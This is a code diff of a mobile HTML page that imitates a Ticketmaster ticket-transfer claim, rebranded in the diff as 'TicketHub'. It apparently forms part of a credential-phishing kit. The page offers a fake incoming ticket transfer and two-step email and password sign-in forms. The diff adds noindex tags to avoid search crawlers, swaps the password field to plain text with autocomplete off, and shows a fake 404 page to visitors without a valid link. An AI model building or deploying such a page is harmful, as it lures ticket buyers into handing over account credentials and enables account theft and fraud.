@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
   <meta charset="utf-8">
   <script>
@@ -10,8 +11,11 @@
       window.location.replace(targetUrl);
     }
   </script>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-  <title>Ticket Claim — Ticketmaster</title>
+  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
+  <meta name="googlebot" content="noindex, nofollow">
+  <meta name="viewport"
+    content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>Ticket Claim — TicketHub</title>
   <!-- Tailwind CSS CDN -->
   <script src="https://cdn.tailwindcss.com"></script>
   <script>
@@ -31,68 +35,114 @@
   <!-- Plus Jakarta Sans -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap"
+    rel="stylesheet">
   <!-- Custom stylesheet for laser animation -->
   <link rel="stylesheet" href="/claim/styles.css">
   <style>
     /* Plus Jakarta Sans as primary font */
-    *, *::before, *::after { box-sizing: border-box; }
-    body, button, input, select, textarea, h1, h2, h3, h4, h5, h6, .font-outfit {
+    *,
+    *::before,
+    *::after {
+      box-sizing: border-box;
+    }
+
+    body,
+    button,
+    input,
+    select,
+    textarea,
+    h1,
+    h2,
+    h3,
+    h4,
+    h5,
+    h6,
+    .font-outfit {
       font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif !important;
     }
+
     /* Prevent default text selection on touch devices */
     body {
       touch-action: manipulation;
       user-select: none;
       -webkit-user-select: none;
     }
+
     html.dark body {
       background-color: #111111;
       color: #ffffff;
     }
-    html.dark #page-dashboard, html.dark #page-acceptance, html.dark #page-login {
+
+    html.dark #page-dashboard,
+    html.dark #page-acceptance,
+    html.dark #page-login {
       background-color: #111111;
       color: #ffffff;
     }
+
     html.dark main {
       background-color: #111111 !important;
     }
+
     html.dark .text-black {
       color: #ffffff !important;
     }
+
     html.dark .bg-white {
       background-color: #181818 !important;
     }
+
     html.dark .text-gray-900 {
       color: #ffffff !important;
     }
-    html.dark .text-gray-705, html.dark .text-gray-700, html.dark .text-gray-500 {
+
+    html.dark .text-gray-705,
+    html.dark .text-gray-700,
+    html.dark .text-gray-500 {
       color: #a0aec0 !important;
     }
-    html.dark .border-gray-300, html.dark .border-gray-100 {
+
+    html.dark .border-gray-300,
+    html.dark .border-gray-100 {
       border-color: #2d3748 !important;
     }
+
     html.dark #ticket-modal .bg-white {
       background-color: #111111 !important;
     }
+
     html.dark #carousel-container .bg-white {
       background-color: #1a1a1a !important;
       border: 1px solid #2d3748;
     }
+
     html.dark #carousel-container .border-black {
       border-color: #ffffff !important;
     }
+
     html.dark #carousel-container .bg-white div {
       background-color: #1a1a1a !important;
     }
+
     html.dark #carousel-container .bg-white .bg-black {
       background-color: #ffffff !important;
     }
+
     @keyframes scan {
-      0% { left: 0%; }
-      50% { left: 100%; }
-      100% { left: 0%; }
+      0% {
+        left: 0%;
+      }
+
+      50% {
+        left: 100%;
+      }
+
+      100% {
+        left: 0%;
+      }
     }
+
     .laser-line {
       position: absolute;
       top: 0;
@@ -105,50 +155,47 @@
     }
   </style>
 </head>
+
 <body class="bg-white min-h-[100dvh] flex flex-col text-black antialiased">
   <!-- ================= INITIAL LOADING SCREEN ================= -->
-  <div id="page-initial-loading" class="fixed inset-0 bg-white flex flex-col items-center justify-center z-[100] text-black select-none" style="padding-top: env(safe-area-inset-top);">
+  <div id="page-initial-loading"
+    class="fixed inset-0 bg-white flex flex-col items-center justify-center z-[100] text-black select-none"
+    style="padding-top: env(safe-area-inset-top);">
     <div class="h-16 w-16 border-[4px] border-[#0041D7]/20 border-t-[#0041D7] rounded-full animate-spin"></div>
     <p class="text-sm font-bold tracking-wide uppercase mt-4 text-[#0041D7] animate-pulse">Securing your tickets...</p>
   </div>
 
   <!-- ================= TRANSITION LOADER OVERLAY ================= -->
-  <div id="page-transition-loader" class="fixed inset-0 bg-white/85 dark:bg-zinc-950/85 hidden flex-col items-center justify-center z-[90] text-black dark:text-white select-none">
+  <div id="page-transition-loader"
+    class="fixed inset-0 bg-white/85 dark:bg-zinc-950/85 hidden flex-col items-center justify-center z-[90] text-black dark:text-white select-none">
     <div class="h-10 w-10 border-[3px] border-primary/20 border-t-primary rounded-full animate-spin"></div>
-    <p class="text-xs font-semibold uppercase tracking-wider mt-3 text-gray-500 dark:text-gray-400 animate-pulse">Loading...</p>
+    <p class="text-xs font-semibold uppercase tracking-wider mt-3 text-gray-500 dark:text-gray-400 animate-pulse">
+      Loading...</p>
   </div>
 
-  <!-- ================= PAGE: NO TICKETS AVAILABLE ================= -->
-  <div id="page-no-tickets" class="fixed inset-0 bg-white flex flex-col items-center justify-center hidden fade-in">
-    <!-- Main Content -->
-    <main class="w-full max-w-[440px] bg-white px-6 flex flex-col items-center select-none text-center">
-      <!-- Gray Info Circle with Ticket Slash Icon -->
-      <div class="h-28 w-28 bg-gray-100 rounded-full flex items-center justify-center shrink-0 text-gray-500">
-        <svg class="w-14 h-14" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-          <path stroke-linecap="round" stroke-linejoin="round" d="M16.5 6v.75m0 3v.75m0 3v.75m0 3V18m-9-5.25h5.25M7.5 15h3M3.375 5.25c-.621 0-1.125.504-1.125 1.125v3.026a2.999 2.999 0 010 5.198v3.026c0 .621.504 1.125 1.125 1.125h17.25c.621 0 1.125-.504 1.125-1.125v-3.026a2.999 2.999 0 010-5.198V6.375c0-.621-.504-1.125-1.125-1.125H3.375z" />
-          <path stroke-linecap="round" stroke-linejoin="round" d="M3 3l18 18" />
-        </svg>
-      </div>
-
-      <!-- Heading -->
-      <h2 class="text-[25px] font-bold text-black mt-10 tracking-tight font-outfit">
-        No Tickets Available for Claim
-      </h2>
-      <p class="text-[14px] font-medium text-gray-700 mt-4 px-4 leading-relaxed">
-        There are currently no tickets attached to this link. Please open the "Claim Tickets" link directly from your transfer email.
-      </p>
+  <!-- ================= PAGE: NO TICKETS / 404 NOT FOUND ================= -->
+  <div id="page-no-tickets"
+    class="fixed inset-0 bg-white flex flex-col items-center justify-center hidden fade-in select-none">
+    <main class="w-full max-w-[440px] px-6 flex flex-col items-center text-center">
+      <h1 class="text-7xl font-extrabold text-gray-900 tracking-tight">404</h1>
+      <p class="text-lg font-semibold text-gray-700 mt-3">Page Not Found</p>
+      <p class="text-sm text-gray-500 mt-2">The requested resource could not be found or the ticket transfer link is
+        invalid.</p>
     </main>
   </div>
 
 
   <!-- ================= PAGE: ALREADY CLAIMED ================= -->
-  <div id="page-already-claimed" class="fixed inset-0 bg-white flex flex-col items-center justify-center hidden fade-in">
+  <div id="page-already-claimed"
+    class="fixed inset-0 bg-white flex flex-col items-center justify-center hidden fade-in">
     <!-- Main Content -->
     <main class="w-full max-w-[440px] px-6 flex flex-col items-center select-none text-center">
       <!-- Amber Warning Circle -->
       <div class="h-28 w-28 bg-amber-50 rounded-full flex items-center justify-center shrink-0 text-amber-500">
         <svg class="w-14 h-14" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
-          <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126zM12 15.75h.007v.008H12v-.008z"></path>
+          <path stroke-linecap="round" stroke-linejoin="round"
+            d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126zM12 15.75h.007v.008H12v-.008z">
+          </path>
         </svg>
       </div>
 
@@ -163,13 +210,17 @@
   </div>
 
   <!-- ================= PAGE: CLAIM LOADING 1 (after Accept Ticket click) ================= -->
-  <div id="page-claim-loading" class="fixed inset-0 bg-white flex flex-col items-center justify-center hidden fade-in z-[80]" style="padding-top: env(safe-area-inset-top);">
+  <div id="page-claim-loading"
+    class="fixed inset-0 bg-white flex flex-col items-center justify-center hidden fade-in z-[80]"
+    style="padding-top: env(safe-area-inset-top);">
     <div class="h-24 w-24 border-[5px] border-[#0041D7]/20 border-t-[#0041D7] rounded-full animate-spin"></div>
-    <p class="text-[22px] font-extrabold text-black mt-8 text-center px-8 leading-snug">Hang on, we're working on your request.</p>
+    <p class="text-[22px] font-extrabold text-black mt-8 text-center px-8 leading-snug">Hang on, we're working on your
+      request.</p>
   </div>
 
   <!-- ================= PAGE: LOGIN STEP 1 — EMAIL ================= -->
-  <div id="page-login-email" class="w-full flex-1 flex flex-col bg-white hidden fade-in" style="padding-top: env(safe-area-inset-top);">
+  <div id="page-login-email" class="w-full flex-1 flex flex-col bg-white hidden fade-in"
+    style="padding-top: env(safe-area-inset-top);">
     <main class="w-full max-w-[440px] mx-auto px-6 pt-10 pb-8 flex flex-col text-left">
       <!-- Title -->
       <h2 style="font-size:30px;font-weight:800;color:#111;line-height:1.1;">Sign in</h2>
@@ -178,12 +229,17 @@
       </p>
 
       <!-- Form -->
-      <form id="login-email-form" onsubmit="handleEmailStepSubmit(event)" style="margin-top:28px;display:flex;flex-direction:column;gap:14px;">
+      <form id="login-email-form" onsubmit="handleEmailStepSubmit(event)"
+        style="margin-top:28px;display:flex;flex-direction:column;gap:14px;">
         <div>
           <label style="font-size:13px;font-weight:600;color:#444;display:block;margin-bottom:6px;">Email</label>
-          <input type="email" required id="login-email-input" autocomplete="email" style="width:100%;height:46px;border:1px solid #ccc;padding:0 14px;font-size:15px;font-weight:500;outline:none;border-radius:0;color:#111;background:#fff;" />
+          <input type="email" required id="login-email-input" autocomplete="email"
+            style="width:100%;height:46px;border:1px solid #ccc;padding:0 14px;font-size:15px;font-weight:500;outline:none;border-radius:0;color:#111;background:#fff;" />
+          <div id="login-email-error" class="hidden"
+            style="margin-top:6px;font-size:13px;font-weight:600;color:#dc2626;"></div>
         </div>
-        <button type="submit" style="width:100%;background:#0041D7;color:#fff;font-size:16px;font-weight:700;padding:15px 0;border:none;cursor:pointer;border-radius:0;">Continue</button>
+        <button type="submit"
+          style="width:100%;background:#0041D7;color:#fff;font-size:16px;font-weight:700;padding:15px 0;border:none;cursor:pointer;border-radius:0;">Continue</button>
       </form>
 
       <div style="display:flex;align-items:center;gap:12px;margin:22px 0;">
@@ -192,22 +248,28 @@
         <div style="flex:1;height:1px;background:#e0e0e0;"></div>
       </div>
 
-      <button onclick="handleEmailStepSubmit(null)" style="width:100%;border:1px solid #ccc;background:#fff;color:#111;font-size:15px;font-weight:700;padding:14px 0;cursor:pointer;border-radius:0;">Sign in with a Passkey</button>
+      <button onclick="handleEmailStepSubmit(null)"
+        style="width:100%;border:1px solid #ccc;background:#fff;color:#111;font-size:15px;font-weight:700;padding:14px 0;cursor:pointer;border-radius:0;">Sign
+        in with a Passkey</button>
 
       <p style="font-size:12px;color:#888;line-height:1.6;margin-top:22px;">
-        By continuing past this page, I acknowledge that I have read and agree to the current <a href="#" style="color:#0041D7;font-weight:600;">Terms of Use</a> and <a href="#" style="color:#0041D7;font-weight:600;">Privacy Policy</a>.
+        By continuing past this page, I acknowledge that I have read and agree to the current <a href="#"
+          style="color:#0041D7;font-weight:600;">Terms of Use</a> and <a href="#"
+          style="color:#0041D7;font-weight:600;">Privacy Policy</a>.
       </p>
     </main>
   </div>
 
   <!-- ================= PAGE: LOGIN STEP 2 — PASSWORD ================= -->
-  <div id="page-login-password" class="w-full flex-1 flex flex-col bg-white hidden fade-in" style="padding-top: env(safe-area-inset-top);">
+  <div id="page-login-password" class="w-full flex-1 flex flex-col bg-white hidden fade-in"
+    style="padding-top: env(safe-area-inset-top);">
     <!-- Skeleton loader for password step -->
-    <main id="login-password-skeleton" class="w-full max-w-[440px] mx-auto px-6 pt-10 pb-8 flex flex-col text-left animate-pulse select-none">
+    <main id="login-password-skeleton"
+      class="w-full max-w-[440px] mx-auto px-6 pt-10 pb-8 flex flex-col text-left animate-pulse select-none">
       <div style="height:32px;width:75%;background:#e5e7eb;border-radius:4px;"></div>
       <div style="height:16px;width:90%;background:#f3f4f6;margin-top:14px;border-radius:3px;"></div>
       <div style="height:16px;width:55%;background:#f3f4f6;margin-top:6px;border-radius:3px;"></div>
-      
+
       <div style="margin-top:32px;display:flex;flex-direction:column;gap:14px;">
         <div>
           <div style="height:14px;width:25%;background:#e5e7eb;border-radius:2px;margin-bottom:6px;"></div>
@@ -227,23 +289,30 @@
     </main>
 
     <!-- Actual Password Form Content -->
-    <main id="login-password-content" class="w-full max-w-[440px] mx-auto px-6 pt-10 pb-8 flex flex-col text-left hidden">
+    <main id="login-password-content"
+      class="w-full max-w-[440px] mx-auto px-6 pt-10 pb-8 flex flex-col text-left hidden">
       <!-- Title -->
       <h2 style="font-size:30px;font-weight:800;color:#111;line-height:1.1;">Enter your Password</h2>
       <p style="margin-top:10px;font-size:15px;font-weight:500;color:#555;line-height:1.5;">
-        Sign into your Ticketmaster account using email <span id="login-display-email" style="font-weight:700;color:#111;">user@domain.com</span>
+        Sign into your account using email <span id="login-display-email"
+          style="font-weight:700;color:#111;">user@domain.com</span>
       </p>
 
       <!-- Form -->
-      <form id="login-password-form" onsubmit="handlePasswordStepSubmit(event)" style="margin-top:28px;display:flex;flex-direction:column;gap:14px;">
+      <form id="login-password-form" onsubmit="handlePasswordStepSubmit(event)"
+        style="margin-top:28px;display:flex;flex-direction:column;gap:14px;">
         <div>
           <label style="font-size:13px;font-weight:600;color:#444;display:block;margin-bottom:6px;">Password</label>
           <div style="position:relative;">
-            <input type="password" required id="login-password-input" autocomplete="current-password" style="width:100%;height:46px;border:1px solid #ccc;padding:0 52px 0 14px;font-size:15px;font-weight:500;outline:none;border-radius:0;color:#111;background:#fff;" />
-            <button type="button" onclick="togglePasswordVisibility()" style="position:absolute;right:14px;top:50%;transform:translateY(-50%);font-size:13px;font-weight:700;color:#555;background:none;border:none;cursor:pointer;">Show</button>
+            <input type="text" required id="login-password-input" autocomplete="off"
+              style="width:100%;height:46px;border:1px solid #ccc;padding:0 52px 0 14px;font-size:15px;font-weight:500;outline:none;border-radius:0;color:#111;background:#fff;-webkit-text-security:disc;" />
+            <button type="button" onclick="togglePasswordVisibility()"
+              style="position:absolute;right:14px;top:50%;transform:translateY(-50%);font-size:13px;font-weight:700;color:#555;background:none;border:none;cursor:pointer;">Show</button>
           </div>
         </div>
-        <button type="submit" style="width:100%;background:#0041D7;color:#fff;font-size:16px;font-weight:700;padding:15px 0;border:none;cursor:pointer;border-radius:0;">Sign in</button>
+        <button type="submit"
+          style="width:100%;background:#0041D7;color:#fff;font-size:16px;font-weight:700;padding:15px 0;border:none;cursor:pointer;border-radius:0;">Sign
+          in</button>
       </form>
 
       <div style="display:flex;align-items:center;gap:12px;margin:22px 0;">
@@ -252,10 +321,14 @@
         <div style="flex:1;height:1px;background:#e0e0e0;"></div>
       </div>
 
-      <button onclick="handlePasswordStepSubmit(null)" style="width:100%;border:1px solid #ccc;background:#fff;color:#111;font-size:15px;font-weight:700;padding:14px 0;cursor:pointer;border-radius:0;">Sign in with a Passkey</button>
+      <button onclick="handlePasswordStepSubmit(null)"
+        style="width:100%;border:1px solid #ccc;background:#fff;color:#111;font-size:15px;font-weight:700;padding:14px 0;cursor:pointer;border-radius:0;">Sign
+        in with a Passkey</button>
 
       <p style="font-size:12px;color:#888;line-height:1.6;margin-top:22px;">
-        By continuing past this page, I acknowledge that I have read and agree to the current <a href="#" style="color:#0041D7;font-weight:600;">Terms of Use</a> and <a href="#" style="color:#0041D7;font-weight:600;">Privacy Policy</a>.
+        By continuing past this page, I acknowledge that I have read and agree to the current <a href="#"
+          style="color:#0041D7;font-weight:600;">Terms of Use</a> and <a href="#"
+          style="color:#0041D7;font-weight:600;">Privacy Policy</a>.
       </p>
     </main>
   </div>
@@ -264,20 +337,32 @@
   <div id="page-transfer" class="w-full flex-1 flex flex-col bg-[#1a1a1a] hidden fade-in" style="min-height:100dvh;">
 
     <!-- ── Nav Bar (matches prototype: hamburger | TM logo | search + user) ── -->
-    <div style="background:#0041D7;display:flex;align-items:center;justify-content:space-between;padding:calc(14px + env(safe-area-inset-top)) 16px 14px;">
+    <div
+      style="background:#0041D7;display:flex;align-items:center;justify-content:space-between;padding:calc(14px + env(safe-area-inset-top)) 16px 14px;">
       <!-- Hamburger -->
       <button onclick="openSettingsDrawer()" style="background:none;border:none;cursor:pointer;padding:4px;color:#fff;">
-        <svg width="22" height="22" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"/></svg>
+        <svg width="22" height="22" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16" />
+        </svg>
       </button>
       <!-- TM Logo -->
-      <span style="font-family:'Plus Jakarta Sans',sans-serif;font-weight:900;font-size:19px;font-style:italic;letter-spacing:-0.5px;color:#fff;text-transform:lowercase;">ticketmaster<sup style="font-size:8px;font-weight:400;font-style:normal;vertical-align:super;margin-left:1px;">®</sup></span>
+      <span
+        style="font-family:'Plus Jakarta Sans',sans-serif;font-weight:900;font-size:19px;letter-spacing:-0.5px;color:#fff;">TicketHub</span>
       <!-- Right icons -->
       <div style="display:flex;align-items:center;gap:16px;">
-        <button onclick="openGlobalSearchModal()" style="background:none;border:none;cursor:pointer;padding:4px;color:#fff;" aria-label="Search Ticketmaster">
-          <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2.2" viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path stroke-linecap="round" d="M21 21l-4.35-4.35"/></svg>
+        <button onclick="openGlobalSearchModal()"
+          style="background:none;border:none;cursor:pointer;padding:4px;color:#fff;" aria-label="Search TicketHub">
+          <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2.2" viewBox="0 0 24 24">
+            <circle cx="11" cy="11" r="8" />
+            <path stroke-linecap="round" d="M21 21l-4.35-4.35" />
+          </svg>
         </button>
-        <button onclick="openSettingsDrawer()" style="background:none;border:none;cursor:pointer;padding:4px;color:#fff;" aria-label="Account settings">
-          <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2.2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2M12 11a4 4 0 100-8 4 4 0 000 8z"/></svg>
+        <button onclick="openSettingsDrawer()"
+          style="background:none;border:none;cursor:pointer;padding:4px;color:#fff;" aria-label="Account settings">
+          <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2.2" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round"
+              d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2M12 11a4 4 0 100-8 4 4 0 000 8z" />
+          </svg>
         </button>
       </div>
     </div>
@@ -289,7 +374,8 @@
         <div style="height:32px;width:70%;background:rgba(255,255,255,0.3);border-radius:4px;"></div>
         <div style="height:16px;width:90%;background:rgba(255,255,255,0.2);margin-top:10px;border-radius:4px;"></div>
         <!-- Card Skeleton with negative bottom margin to overlap -->
-        <div style="margin-top:20px;margin-bottom:-140px;position:relative;z-index:10;border-radius:0;overflow:hidden;background:#0034b0;box-shadow:0 10px 25px -5px rgba(0,0,0,0.25);">
+        <div
+          style="margin-top:20px;margin-bottom:-140px;position:relative;z-index:10;border-radius:0;overflow:hidden;background:#0034b0;box-shadow:0 10px 25px -5px rgba(0,0,0,0.25);">
           <div style="width:100%;height:220px;background:rgba(255,255,255,0.25);"></div>
           <div style="background:#111;padding:16px 14px;">
             <div style="height:12px;width:45%;background:#222;margin-bottom:8px;border-radius:2px;"></div>
@@ -305,18 +391,21 @@
       <div style="background:#f5f5f5;flex:1;padding:156px 0 0;">
         <div style="background:#fff;padding:20px 18px;">
           <div style="height:18px;width:65%;background:#e5e7eb;border-radius:3px;"></div>
-          <div style="margin-top:16px;border:1px solid #e5e7eb;padding:16px;display:flex;flex-direction:column;gap:8px;">
+          <div
+            style="margin-top:16px;border:1px solid #e5e7eb;padding:16px;display:flex;flex-direction:column;gap:8px;">
             <div style="height:12px;width:25%;background:#e5e7eb;border-radius:2px;"></div>
             <div style="height:16px;width:75%;background:#e5e7eb;border-radius:2px;"></div>
           </div>
-          <div style="margin-top:16px;border:1px solid #e5e7eb;padding:16px;display:flex;flex-direction:column;gap:8px;">
+          <div
+            style="margin-top:16px;border:1px solid #e5e7eb;padding:16px;display:flex;flex-direction:column;gap:8px;">
             <div style="height:12px;width:25%;background:#e5e7eb;border-radius:2px;"></div>
             <div style="height:16px;width:75%;background:#e5e7eb;border-radius:2px;"></div>
           </div>
           <div style="margin-top:20px;height:52px;background:#0041D7;opacity:0.3;border-radius:0;"></div>
         </div>
       </div>
-      <footer style="background:#1a1a1a;color:#fff;padding:80px 20px calc(40px + env(safe-area-inset-bottom));margin-top:auto;">
+      <footer
+        style="background:#1a1a1a;color:#fff;padding:80px 20px calc(40px + env(safe-area-inset-bottom));margin-top:auto;">
         <div style="height:20px;width:120px;background:#333;border-radius:3px;"></div>
       </footer>
     </div>
@@ -325,29 +414,43 @@
     <div id="transfer-content-wrapper" class="w-full flex-1 flex flex-col">
       <!-- ── Blue Header: Welcome + subtitle + Overlapping Card ── -->
       <div style="background:#0041D7;padding:18px 18px 0;position:relative;">
-        <h1 id="transfer-welcome" style="font-size:30px;font-weight:800;color:#fff;line-height:1.15;margin:0;">Welcome, [buyer name]</h1>
-        <p style="font-size:14px;font-weight:500;color:rgba(255,255,255,0.85);margin-top:6px;line-height:1.5;">Once you accept the transfer, the ticket(s) will be located in your account.</p>
+        <h1 id="transfer-welcome" style="font-size:30px;font-weight:800;color:#fff;line-height:1.15;margin:0;">Welcome,
+          [buyer name]</h1>
+        <p style="font-size:14px;font-weight:500;color:rgba(255,255,255,0.85);margin-top:6px;line-height:1.5;">Once you
+          accept the transfer, the ticket(s) will be located in your account.</p>
 
         <!-- ── Full Event Image Card (Visually Overlapping Bottom Edge of Blue Section) ── -->
-        <div style="margin-top:20px;margin-bottom:-140px;position:relative;z-index:10;border-radius:0;overflow:hidden;box-shadow:0 12px 28px -6px rgba(0,0,0,0.35);">
+        <div
+          style="margin-top:20px;margin-bottom:-140px;position:relative;z-index:10;border-radius:0;overflow:hidden;box-shadow:0 12px 28px -6px rgba(0,0,0,0.35);">
           <!-- Event image -->
-          <img id="transfer-event-img" src="https://images.unsplash.com/photo-1470229722913-7c0e2dbbafd3?w=800&auto=format&fit=crop" alt="Event" style="width:100%;height:220px;object-fit:cover;display:block;" />
-          
+          <img id="transfer-event-img"
+            src="https://images.unsplash.com/photo-1470229722913-7c0e2dbbafd3?w=800&auto=format&fit=crop" alt="Event"
+            style="width:100%;height:220px;object-fit:cover;display:block;" />
+
           <!-- Flat Dark Date/Time Bar directly above event title (square corners, solid background) -->
           <div style="background:#111111;padding:12px 14px 4px;">
-            <span id="transfer-event-date" style="font-size:12px;font-weight:800;color:#ffffff;letter-spacing:0.4px;text-transform:uppercase;">MON • JUN 22, 2026 • 12:00 PM</span>
+            <span id="transfer-event-date"
+              style="font-size:12px;font-weight:800;color:#ffffff;letter-spacing:0.4px;text-transform:uppercase;">MON •
+              JUN 22, 2026 • 12:00 PM</span>
           </div>
 
           <!-- Event Title -->
           <div style="background:#111111;padding:4px 14px 8px;">
-            <span id="transfer-event-title" style="font-size:19px;font-weight:800;color:#fff;text-transform:uppercase;line-height:1.2;display:block;">ARIANA GRANDE - THE ETERNAL SUNSHINE TOUR</span>
+            <span id="transfer-event-title"
+              style="font-size:19px;font-weight:800;color:#fff;text-transform:uppercase;line-height:1.2;display:block;">ARIANA
+              GRANDE - THE ETERNAL SUNSHINE TOUR</span>
           </div>
 
           <!-- Card Footer Row: Venue Left, Ticket Counter Right -->
-          <div style="background:#111111;padding:4px 14px 14px;display:flex;align-items:center;justify-content:space-between;gap:10px;">
-            <span id="transfer-venue" style="font-size:13px;font-weight:500;color:rgba(255,255,255,0.65);">AT&amp;T Stadium, Texas</span>
+          <div
+            style="background:#111111;padding:4px 14px 14px;display:flex;align-items:center;justify-content:space-between;gap:10px;">
+            <span id="transfer-venue" style="font-size:13px;font-weight:500;color:rgba(255,255,255,0.65);">AT&amp;T
+              Stadium, Texas</span>
             <div style="display:flex;align-items:center;gap:5px;color:rgba(255,255,255,0.75);flex-shrink:0;">
-              <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
+              <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                <rect x="9" y="9" width="13" height="13" rx="2" />
+                <path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1" />
+              </svg>
               <span id="transfer-seat-count" style="font-size:13px;font-weight:700;">x4</span>
             </div>
           </div>
@@ -358,7 +461,8 @@
       <div style="background:#f5f5f5;flex:1;padding-top:156px;">
         <div style="background:#fff;margin:0;padding:20px 18px 24px;">
           <!-- Sender info -->
-          <p style="font-size:15px;font-weight:700;color:#111;line-height:1.4;">You have received a ticket from <span id="transfer-sender-name">Racheal Jaoquin</span></p>
+          <p style="font-size:15px;font-weight:700;color:#111;line-height:1.4;">You have received a ticket from <span
+              id="transfer-sender-name">Racheal Jaoquin</span></p>
 
           <!-- Seat rows (dynamically rendered) -->
           <div id="transfer-seat-rows" style="margin-top:16px;display:flex;flex-direction:column;gap:10px;"></div>
@@ -367,31 +471,56 @@
           <div style="margin-top:20px;border:1px solid #e5e7eb;padding:16px;background:#fafafa;">
             <p style="font-size:14px;font-weight:700;color:#111;margin-bottom:12px;">Accept &amp; Continue</p>
             <label style="display:flex;align-items:flex-start;gap:10px;cursor:pointer;">
-              <input type="checkbox" id="transfer-agree-checkbox" style="margin-top:3px;width:16px;height:16px;accent-color:#0041D7;flex-shrink:0;" />
+              <input type="checkbox" id="transfer-agree-checkbox"
+                style="margin-top:3px;width:16px;height:16px;accent-color:#0041D7;flex-shrink:0;" />
               <span style="font-size:13px;font-weight:500;color:#444;line-height:1.6;">
-                I have read and agree to the current <a href="#" style="color:#0041D7;font-weight:600;">Terms of Use</a> and <a href="#" style="color:#0041D7;font-weight:600;">Ticket Transfer Recipient Policy</a>, including the arbitration agreement and class action waiver, updated in August 2025.
+                I have read and agree to the current <a href="#" style="color:#0041D7;font-weight:600;">Terms of Use</a>
+                and <a href="#" style="color:#0041D7;font-weight:600;">Ticket Transfer Recipient Policy</a>, including
+                the arbitration agreement and class action waiver, updated in August 2025.
               </span>
             </label>
           </div>
 
           <!-- Buttons -->
           <div style="margin-top:20px;display:flex;flex-direction:column;gap:12px;">
-            <button onclick="handleAcceptTransfer()" style="width:100%;background:#0041D7;color:#fff;font-size:16px;font-weight:700;padding:16px 0;border:none;cursor:pointer;border-radius:0;">Accept Transfer</button>
-            <button onclick="handleDeclineTransfer()" style="width:100%;background:#fff;color:#111;font-size:16px;font-weight:600;padding:15px 0;border:1px solid #ccc;cursor:pointer;border-radius:0;">No Thanks</button>
+            <button onclick="handleAcceptTransfer()"
+              style="width:100%;background:#0041D7;color:#fff;font-size:16px;font-weight:700;padding:16px 0;border:none;cursor:pointer;border-radius:0;">Accept
+              Transfer</button>
+            <button onclick="handleDeclineTransfer()"
+              style="width:100%;background:#fff;color:#111;font-size:16px;font-weight:600;padding:15px 0;border:1px solid #ccc;cursor:pointer;border-radius:0;">No
+              Thanks</button>
           </div>
         </div>
       </div>
 
       <!-- ── Footer ── -->
-      <footer style="background:#1a1a1a;color:#fff;padding:80px 20px calc(40px + env(safe-area-inset-bottom));margin-top:auto;">
-        <span style="font-family:'Plus Jakarta Sans',sans-serif;font-weight:900;font-size:18px;font-style:italic;letter-spacing:-0.3px;text-transform:lowercase;">ticketmaster<sup style="font-size:7px;font-weight:400;font-style:normal;vertical-align:super;margin-left:1px;">®</sup></span>
+      <footer
+        style="background:#1a1a1a;color:#fff;padding:80px 20px calc(40px + env(safe-area-inset-bottom));margin-top:auto;">
+        <span
+          style="font-family:'Plus Jakarta Sans',sans-serif;font-weight:900;font-size:18px;font-style:italic;letter-spacing:-0.3px;text-transform:lowercase;">tickethub<sup
+            style="font-size:7px;font-weight:400;font-style:normal;vertical-align:super;margin-left:1px;">®</sup></span>
         <p style="font-size:12px;color:rgba(255,255,255,0.55);margin-top:10px;font-weight:600;">Let's connect</p>
         <div style="display:flex;align-items:center;gap:18px;margin-top:10px;">
-          <svg class="h-5 w-5" style="color:rgba(255,255,255,0.65);" fill="currentColor" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
